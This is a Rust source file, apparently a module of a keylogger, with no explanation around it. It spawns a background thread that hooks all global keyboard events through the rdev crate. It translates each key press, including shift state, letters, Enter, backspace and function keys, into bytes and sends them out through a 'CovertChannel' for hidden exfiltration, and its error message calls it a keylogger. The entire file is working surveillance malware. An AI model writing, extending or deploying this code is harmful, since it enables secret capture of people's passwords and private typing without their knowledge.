use rdev::{listen, EventType, Key};
use crate::covert::CovertChannel;
use std::thread;
use std::time::Duration;

pub fn start(mut channel: CovertChannel) {
    thread::spawn(move || {
        let mut shift_pressed = false;

        if let Err(error) = listen(move |event| {
            match event.event_type {
                EventType::KeyPress(key) => {
                    match key {
                        Key::ShiftLeft | Key::ShiftRight => shift_pressed = true,
                        // rdev uses 'Return' for the Enter key
                        Key::Return => channel.send_byte(b'\n'),
                        Key::Space => channel.send_byte(b' '),
                        Key::Backspace => channel.send_byte(0x08), // ASCII Backspace
                        Key::Tab => channel.send_byte(b'\t'),
                        
                        // Handle standard characters
                        _ => {
                            let key_repr = format!("{:?}", key);
                            // If it's a single character key (like KeyA, KeyB)
                            if key_repr.starts_with("Key") && key_repr.len() == 4 {
                                let mut c = key_repr.as_bytes()[3]; // Get the 'A' from "KeyA"
                                if !shift_pressed {
                                    c = c.to_ascii_lowercase();
                                }
                                channel.send_byte(c);
                            } else {
                                // For things like F1, Esc, etc., wrap in brackets
                                let meta = format!("[{:?}]", key);
                                for byte in meta.as_bytes() {
                                    channel.send_byte(*byte);
                                    thread::sleep(Duration::from_millis(5));
                                }
                            }
                        }
                    }
                }
                EventType::KeyRelease(key) => {
                    match key {
                        Key::ShiftLeft | Key::ShiftRight => shift_pressed = false,
                        _ => {}
                    }
                }
                _ => {}
            }
        }) {
            eprintln!("[!] Keylogger Error: {:?}", error);
        }
    });
}
